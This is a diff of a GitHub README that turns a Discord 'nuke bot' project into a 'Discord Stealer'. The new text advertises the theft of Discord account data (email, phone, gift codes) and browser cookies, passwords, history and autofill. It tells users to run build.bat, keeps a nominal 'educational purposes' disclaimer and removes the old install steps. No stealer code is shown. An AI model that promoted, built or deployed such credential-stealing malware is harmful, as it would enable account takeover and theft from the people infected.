@@ -1,54 +1,42 @@
-# Discord-Nuke-Bot
-Simple Discord Nuke Bot.
+# Discord Stealer
+Simple Discord Stealer.
+I'd like to point out that I took the source code from addi00000.
+here is its github: https://github.com/addi00000
 
+`this is just for educational purposes do not use it for malicious purposes i am not responsible for your actions.`
 
 # Simple Discord Nuke Bot
 * Python 3.6 - 3.8
 ***
-# Discord Token Info
+# Discord Token Info.
  - [x] Nitro
  - [x] Badges
  - [x] Email
  - [x] Phone
  - [x] Gift Codes
 
+# Browser Data.
+
+ - [x] Cookies
+ - [x] Passwords
+ - [x] History
+ - [x] Bookmarks
+ - [x] Autofiles
+
+
+
 ***
 # Preview
-![](https://cdn.discordapp.com/attachments/949663862611914782/957339415154405496/unknown.png)
+![2023_06_03_02m_Kleki](https://github.com/syslinks/Anonymous-Stealer/assets/97897361/85ec3df8-d3dd-44f2-8b2d-16c305e29b9e)
+
+![ano](https://github.com/syslinks/Anonymous-Stealer/assets/97897361/20342b21-0799-4769-8c69-f322b719455c)
 
 ***
-# Installation:
-## Android(Termux):
-```console
-apt update && apt upgrade
-
-pkg install python git
-
-git clone https://github.com/Nasko596/Discord-Nuke-Bot
-
-cd Discord-Nuke-Bot
-
-python -m pip install -r requirements.txt
-
-python nuke-bot.py
+# Credits :
 ```
-**[Subsequent launches]**
-```console
-cd Discord-Nuke-Bot
-
-python nuke-bot.py
-```
-## Linux / Windows
-```console
-git clone https://github.com/Nasko596/Discord-Nuke-Bot
-
-cd Discord-Nuke-Bot
-
-python -m pip install -r requirements.txt
-
-python3 nuke-bot.py
+SySLinks
 ```
 
 ***
 # Running
-It's that simple! Enter the command `python nuke-bot.py` or `python3 nuke-bot.py` and the nuke bot interface will launch.
+It's that simple ! Execute Build.bat `build.bat` or `build/.py` .
